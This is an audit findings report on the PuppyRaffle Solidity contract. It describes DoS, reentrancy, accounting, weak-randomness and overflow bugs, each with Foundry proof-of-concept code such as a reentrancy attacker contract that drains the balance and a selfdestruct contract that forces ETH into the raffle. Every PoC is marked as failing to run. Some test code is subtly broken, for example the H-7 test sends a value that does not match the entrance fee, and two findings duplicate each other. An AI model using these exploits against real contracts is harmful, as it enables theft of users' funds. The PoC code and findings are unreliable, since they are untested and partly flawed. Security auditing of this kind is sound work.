# 4 puppy raffle audit - Findings Report
## Commit hash: 3ff0f0bfddf25fd0c160fe57388fa6ff2e0f0960

##Findings by Status


Finding Status: Valid


[M-1]. Unbounded duplicate check in `enterRaffle` causes DoS via block gas limit
**Derived From** : GasGriefBlockLimit
Finding Status: Valid
Privilege: Permissionless


[M-2]. Strict balance equality check in `withdrawFees` enables DoS via forced ETH
**Derived From** : CheapGriefingOrDosProfit
Finding Status: Valid
Privilege: Permissionless


[H-3]. Reentrancy in `refund` allows draining contract balance
**Derived From** : ERC777 Hook Reentrancy
Finding Status: Valid
Privilege: Permissionless


[H-4]. `selectWinner` logic fails to account for refunded players, causing insolvency and DoS
**Derived From** : AccountingInvariantViolation
Finding Status: Valid
Privilege: Permissionless


[H-5]. Weak randomness in `selectWinner` allows predicting or manipulating the winner
**Derived From** : BlockVarsAsPrimaryRandomnessSource
Finding Status: Valid
Privilege: Permissionless


[M-6]. Integer overflow in `totalFees` causes permanent lock of protocol fees
**Derived From** : AccountingInvariantViolation
Finding Status: Valid
Privilege: Permissionless


[H-7]. Integer Overflow and Unsafe Casting in totalFees leads to permanently stuck fees
**Derived From** : IntegerOverflow
Finding Status: Valid
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 4
- M: 3
- L: 0
- I: 0

##Findings by Status


Finding Status: Valid
## [M-1]. Unbounded duplicate check in `enterRaffle` causes DoS via block gas limit

## id: 509bFGOfryp9ANwY2uilg

## Derived From Pattern/Invariant
GasGriefBlockLimit

## Exploit Type
GasGriefBlockLimit

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
### Finding Status Justification: `enterRaffle` appends `newPlayers` to storage, then checks duplicates via a nested loop over the entire `players` array (O(n^2)). As `players.length` grows, gas rises quadratically and can exceed the block gas limit, reverting future `enterRaffle` calls (DoS for new entrants). There is no pagination, mapping/set, or gas cap mechanism. While an attacker must pay `entranceFee * n` to bloat the array (non-zero cost), it is still feasible to grief availability, so exploitability exists with realistic but non-trivial cost.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `enterRaffle` function performs a nested loop to check for duplicate players (`O(N^2)` complexity). As the `players` array grows, the gas required to enter increases quadratically. An attacker can fill the array with many addresses until the gas cost to add one more player exceeds the block gas limit, effectively causing a DoS for new entrants.

## Impact
Denial of Service for legitimate players wanting to enter the raffle.

## Command to Run Test


## Proof of Concept
1. Attacker enters 100 players in a batch. 
2. Attacker enters another 100 players. 
3. The gas cost for the second batch is significantly higher. 
4. Eventually, transactions revert due to Out of Gas.

## Proof of Code
function testDosGas() public { address[] memory players = new address[](100); for (uint i=0; i<100; i++) { players[i] = address(uint(keccak256(abi.encode(i)))); } puppyRaffle.enterRaffle{value: 100e18}(players); 

 uint256 gasStart = gasleft(); 
 address[] memory onePlayer = new address[](1); onePlayer[0] = address(0x123); 
 puppyRaffle.enterRaffle{value: 1e18}(onePlayer); 
 uint256 gasUsed = gasStart - gasleft(); 
 // Gas usage is high due to loop 
 assert(gasUsed > 0); }

## Suggested Mitigation
Use a mapping (`mapping(address => bool)`) to check for duplicates in `O(1)` time or use OpenZeppelin's `EnumerableSet`.


## [M-2]. Strict balance equality check in `withdrawFees` enables DoS via forced ETH

## id: FLHEWAufWpjjTckYC597Y

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit

## Exploit Type
Dos

## Location
PuppyRaffle.withdrawFees

## Finding Status: Valid
### Finding Status Justification: `withdrawFees` requires `address(this).balance == uint256(totalFees)`. Any third party can break this invariant by forcing ETH into the contract (e.g., via `selfdestruct`), even though the contract has no payable receive/fallback. Once balance is greater than `totalFees`, `withdrawFees` will revert indefinitely, permanently locking protocol fees. No alternative withdrawal path exists and no safeguard (like `>=` or tracking active players separately) is present.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `withdrawFees` function enforces `require(address(this).balance == uint256(totalFees), ...);`. This strict equality is easily broken if anyone sends extra ETH to the contract (e.g., via `selfdestruct` or mining rewards). If `address(this).balance > totalFees`, the requirement fails, and the owner cannot withdraw fees.

## Impact
Permanent locking of protocol fees.

## Command to Run Test


## Proof of Concept
1. Attacker deploys a contract with some ETH. 
2. Attacker calls `selfdestruct(puppyRaffleAddress)`. 
3. `puppyRaffle` balance increases by dust amount, but `totalFees` remains same. 
4. `withdrawFees` reverts because `balance != totalFees`.

## Proof of Code
contract SelfDestructor { constructor(address payable _target) payable { selfdestruct(_target); } } 

 function testStrictBalanceDoS() public { address[] memory players = new address[](4); players[0] = address(1); players[1] = address(2); players[2] = address(3); players[3] = address(4); puppyRaffle.enterRaffle{value: 4e18}(players); vm.warp(block.timestamp + duration + 1); puppyRaffle.selectWinner(); 

 // Force send 1 wei 
 new SelfDestructor{value: 1}(payable(address(puppyRaffle))); 

 vm.expectRevert("PuppyRaffle: There are currently players active!"); 
 puppyRaffle.withdrawFees(); }

## Suggested Mitigation
Change the check to `require(address(this).balance >= totalFees)` or remove the check entirely if `totalFees` is trusted.


## [H-3]. Reentrancy in `refund` allows draining contract balance

## id: CXDt0n8EAqQlpIFkVS0aS

## Derived From Pattern/Invariant
ERC777 Hook Reentrancy

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Finding Status: Valid
### Finding Status Justification: `PuppyRaffle.refund` performs an external call (`payable(msg.sender).sendValue(entranceFee)`, OZ Address.sendValue forwards all gas) before updating state (`players[playerIndex] = address(0)`). A malicious contract entered as a player can re-enter `refund(playerIndex)` from its `receive/fallback` while `players[playerIndex]` is still equal to `msg.sender`, passing both requires and receiving multiple refunds for one ticket. No `nonReentrant` modifier or equivalent guard exists, and CEI is violated. This can drain ETH belonging to other players and/or accumulated fees as long as the contract has balance.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `refund` function violates the Checks-Effects-Interactions pattern. It sends ETH to `msg.sender` via `sendValue` (which forwards gas) before marking the player as refunded (`players[playerIndex] = address(0)`). A malicious contract can reenter `refund` during the ETH transfer to claim multiple refunds for a single ticket, draining the contract's balance (including fees and other players' funds).

## Impact
Theft of all funds held by the contract (entrance fees and accumulated protocol fees).

## Command to Run Test


## Proof of Concept
1. Attacker deploys a malicious contract. 2. Malicious contract calls `enterRaffle` entering itself. 3. Malicious contract calls `refund`. 4. Inside `receive()` or `fallback()`, the malicious contract calls `refund` again with the same index. 5. Since `players[playerIndex]` is not yet zeroed, the check passes and ETH is sent again.

## Proof of Code
contract ReentrancyAttacker { PuppyRaffle raffle; uint256 index; constructor(PuppyRaffle _raffle) { raffle = _raffle; } function attack() external payable { address[] memory players = new address[](1); players[0] = address(this); raffle.enterRaffle{value: 1e18}(players); index = raffle.getActivePlayerIndex(address(this)); raffle.refund(index); } receive() external payable { if (address(raffle).balance >= 1e18) { raffle.refund(index); } } } 

 function testReentrancy() public { ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle); vm.deal(address(attacker), 1e18); vm.deal(address(puppyRaffle), 10e18); // Simulate other funds attacker.attack(); assertEq(address(puppyRaffle).balance, 0); }

## Suggested Mitigation
Move the state update `players[playerIndex] = address(0);` before the external call `payable(msg.sender).sendValue(entranceFee);` (Checks-Effects-Interactions pattern).


## [H-4]. `selectWinner` logic fails to account for refunded players, causing insolvency and DoS

## id: zGh14KerkHok1z1oeIRzp

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: Refunds set `players[playerIndex]=address(0)` but do not reduce `players.length`. `selectWinner` uses `players.length * entranceFee` to compute `totalAmountCollected`, inflating `prizePool`/`fee` relative to actual contract balance after refunds. This can make the prize transfer revert due to insufficient balance, blocking `selectWinner` (round cannot end). Additionally, `winnerIndex` is modulo `players.length` and may select an `address(0)` slot; while the ETH call could succeed, `_safeMint(address(0), tokenId)` will revert, also DoSing round finalization. There is no logic to skip zero entries in selection or accounting.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `selectWinner` function calculates `totalAmountCollected` based on `players.length`, ignoring that refunded players leave `address(0)` gaps in the array. The `prizePool` (80%) and `fee` (20%) are calculated on this inflated amount. However, the contract balance only contains funds from active players (refunded players withdrew their fees). 

This leads to two issues: 
1. If `prizePool > address(this).balance`, the transfer to the winner reverts, creating a Denial of Service (raffle cannot end). 
2. If `address(this).balance` is sufficient (due to accumulated unwithdrawn fees), the prize is paid out using protocol fees, causing `withdrawFees` to permanently revert later (since `balance < totalFees`). 

Additionally, if the RNG picks a refunded index (where `player == address(0)`), `_safeMint` reverts, also causing DoS.

## Impact
Raffle DoS (funds stuck) or theft of protocol fees by the prize pool.

## Command to Run Test


## Proof of Concept
1. 4 players enter (Balance = 4 ETH). 
2. 1 player refunds (Balance = 3 ETH, players.length = 4). 
3. `selectWinner` called. 
4. `totalAmountCollected` = 4 ETH. `prizePool` = 3.2 ETH. 
5. Contract tries to send 3.2 ETH but only has 3 ETH. Transaction reverts.

## Proof of Code
function testRefundBreaksSelectWinner() public { address[] memory players = new address[](4); players[0] = address(1); players[1] = address(2); players[2] = address(3); players[3] = address(4); puppyRaffle.enterRaffle{value: 4e18}(players); 

 vm.prank(address(1)); puppyRaffle.refund(0); 

 vm.warp(block.timestamp + duration + 1); 

 // This will revert due to insufficient funds or picking address(0) 
 vm.expectRevert(); puppyRaffle.selectWinner(); }

## Suggested Mitigation
Skip `address(0)` entries when calculating `totalAmountCollected` and when selecting a winner. Alternatively, use a better data structure (like swap-and-pop) to remove refunded players from the array entirely.


## [H-5]. Weak randomness in `selectWinner` allows predicting or manipulating the winner

## id: ISxA03jJuomnzlGO4uEn3

## Derived From Pattern/Invariant
BlockVarsAsPrimaryRandomnessSource

## Exploit Type
Randomness

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: `selectWinner` derives `winnerIndex` from `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty)) % players.length`. The caller controls `msg.sender` (can choose contract address) and block values are predictable to/controllable by the block producer (and partially influenceable via MEV timing). This is not secure randomness for lotteries: a sophisticated attacker/validator can bias outcomes by choosing when/if to call `selectWinner` and by block production influence. No commit-reveal or VRF is used.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The winner selection uses `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))` as the source of randomness. All these values are predictable or controllable. `msg.sender` is the caller (attacker), and block variables are known to the miner or viewable in the mempool. An attacker can calculate the winning index off-chain or via a contract and only call `selectWinner` when they are guaranteed to win.

## Impact
Guaranteed win of the raffle pot.

## Command to Run Test


## Proof of Concept
1. Attacker monitors `players.length`. 
2. Attacker writes a contract that simulates the `keccak256` hash using current block variables and its own address. 
3. The contract loops through nonces or waits for a block where the modulo operation results in the attacker's index. 
4. Contract calls `selectWinner` to claim the prize.

## Proof of Code
function testWeakRandomness() public { address[] memory players = new address[](1); players[0] = address(this); puppyRaffle.enterRaffle{value: 1e18}(players); vm.warp(block.timestamp + duration + 1); 

 // Predict winner 
 uint256 winnerIndex = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 1; 
 assertEq(winnerIndex, 0); 

 puppyRaffle.selectWinner(); assertEq(puppyRaffle.balanceOf(address(this)), 1); }

## Suggested Mitigation
Use Chainlink VRF for secure randomness. Do not use `msg.sender` or block variables as the primary entropy source.


## [M-6]. Integer overflow in `totalFees` causes permanent lock of protocol fees

## id: g_D29JP5GF1OwR1w_ZCgk

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: The contract uses Solidity 0.7.6 (unchecked arithmetic). `totalFees` is `uint64` and is updated as `totalFees = totalFees + uint64(fee);` in `selectWinner`. Over time, accumulated fees can exceed `type(uint64).max` (~18.44 ETH in wei), causing wraparound. Because `withdrawFees` requires strict equality between contract balance and `totalFees`, an overflowed `totalFees` will no longer match the actual ETH retained for fees, making `withdrawFees` revert and locking protocol revenue. No SafeMath or wider integer type is used.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
`totalFees` is a `uint64`. In Solidity 0.7.6, arithmetic operations are unchecked by default. The line `totalFees = totalFees + uint64(fee);` can overflow if accumulated fees exceed ~18.4 ETH (`type(uint64).max`). If overflow occurs, `totalFees` resets to a low value. The `withdrawFees` function requires `address(this).balance == uint256(totalFees)`. Since the actual balance (with correct fees) will exceed the overflowed `totalFees`, this check will fail, and fees will be permanently locked.

## Impact
Permanent loss of protocol revenue.

## Command to Run Test


## Proof of Concept
1. Protocol accumulates fees close to `type(uint64).max`. 
2. A raffle finishes with a fee that pushes the total over the limit. 
3. `totalFees` wraps around. 
4. Owner calls `withdrawFees`. 
5. `require(address(this).balance == totalFees)` fails.

## Proof of Code
function testTotalFeesOverflow() public { address[] memory players = new address[](4); players[0] = address(1); players[1] = address(2); players[2] = address(3); players[3] = address(4); puppyRaffle.enterRaffle{value: 4e18}(players); vm.warp(block.timestamp + duration + 1); 

 // Artificially set totalFees to near max 
 stdstore.target(address(puppyRaffle)).sig("totalFees()").checked_write(type(uint64).max); 

 puppyRaffle.selectWinner(); 

 // totalFees has overflowed to a small number 
 uint64 fees = puppyRaffle.totalFees(); 
 assertTrue(fees < type(uint64).max); 

 // Withdraw fails 
 vm.expectRevert("PuppyRaffle: There are currently players active!"); 
 puppyRaffle.withdrawFees(); }

## Suggested Mitigation
Use `uint256` for `totalFees` and/or use `SafeMath` (or Solidity 0.8+).


## [H-7]. Integer Overflow and Unsafe Casting in totalFees leads to permanently stuck fees

## id: G629NGsXvQGEPvibFR9t1

## Derived From Pattern/Invariant
IntegerOverflow

## Exploit Type
IntegerOverflow

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: In `selectWinner`, `fee` is a `uint256` but is cast to `uint64` before addition: `totalFees = totalFees + uint64(fee)`. This creates (1) truncation if a single-round fee exceeds `uint64` max (losing accounting for that round), and (2) cumulative overflow over multiple rounds due to unchecked arithmetic in Solidity 0.7.6. Either case desynchronizes `totalFees` from the actual ETH balance reserved for fees; combined with `withdrawFees` requiring `address(this).balance == uint256(totalFees)`, the protocol can permanently brick fee withdrawals. No mitigation exists (no SafeMath, no `uint256 totalFees`, no alternative withdrawal condition).
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The contract is compiled with Solidity `0.7.6`, which does not automatically check for integer overflows. 
In `selectWinner`, the fee is calculated and added to `totalFees`: `totalFees = totalFees + uint64(fee);`.

Two issues exist here:
1. **Unsafe Casting:** `fee` (uint256) is cast to `uint64`. If a single raffle round collects more than ~18.44 ETH (type(uint64).max), `uint64(fee)` will truncate, losing fee revenue.
2. **Overflow:** Even if individual fees are small, `totalFees` accumulates over time. Once the sum exceeds `type(uint64).max`, it wraps around (overflows) to a small value.

In `withdrawFees`, there is a check: `require(address(this).balance == uint256(totalFees), ...);`. 
Because `totalFees` has overflowed or truncated, it will be much smaller than the actual ETH balance held by the contract (which tracks the full correct amount). This equality check will fail, causing `withdrawFees` to revert permanently.

## Impact
Protocol fees are permanently locked in the contract and cannot be withdrawn.

## Command to Run Test


## Proof of Concept
1. Organize a raffle (or sequence of raffles) such that total accumulated fees exceed ~18.44 ETH (`2^64 - 1` wei). 
2. `totalFees` overflows and resets to a low number (e.g., 1). 
3. The actual contract balance holds > 18.44 ETH. 
4. The owner calls `withdrawFees`. 
5. The check `address(this).balance (18.44 ETH) == totalFees (1 wei)` fails. 
6. Transaction reverts.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract OverflowAttack is Test {
    PuppyRaffle raffle;

    function setUp() public {
        raffle = new PuppyRaffle(1e18, address(1), 1 days);
    }

    function testFeeOverflow() public {
        // We simulate a large fee accrual via many runs or one huge run
        // 4 players, entrance fee = 25 ETH -> Total 100 ETH. Fee = 20 ETH.
        // 20 ETH > uint64.max (18.44 ETH)
        
        uint256 feeOver64Bit = 25e18;
        address[] memory players = new address[](4);
        players[0] = address(0x1);
        players[1] = address(0x2);
        players[2] = address(0x3);
        players[3] = address(0x4);
        
        raffle.enterRaffle{value: feeOver64Bit * 4}(players);
        
        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner();
        
        // totalFees cast to uint64 truncated or overflowed
        // Actual balance is correct (previous balance was 0, now it's 20 ETH)
        // But totalFees is truncated
        
        vm.expectRevert("PuppyRaffle: Failed to withdraw fees"); // Or the balance check revert
        // The code has strict check: require(address(this).balance == uint256(totalFees))
        // This will revert
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Use `uint256` for `totalFees` instead of `uint64`. Use `SafeMath` or upgrade to Solidity ^0.8.0 to prevent overflows. Remove the unsafe cast `uint64(fee)`.



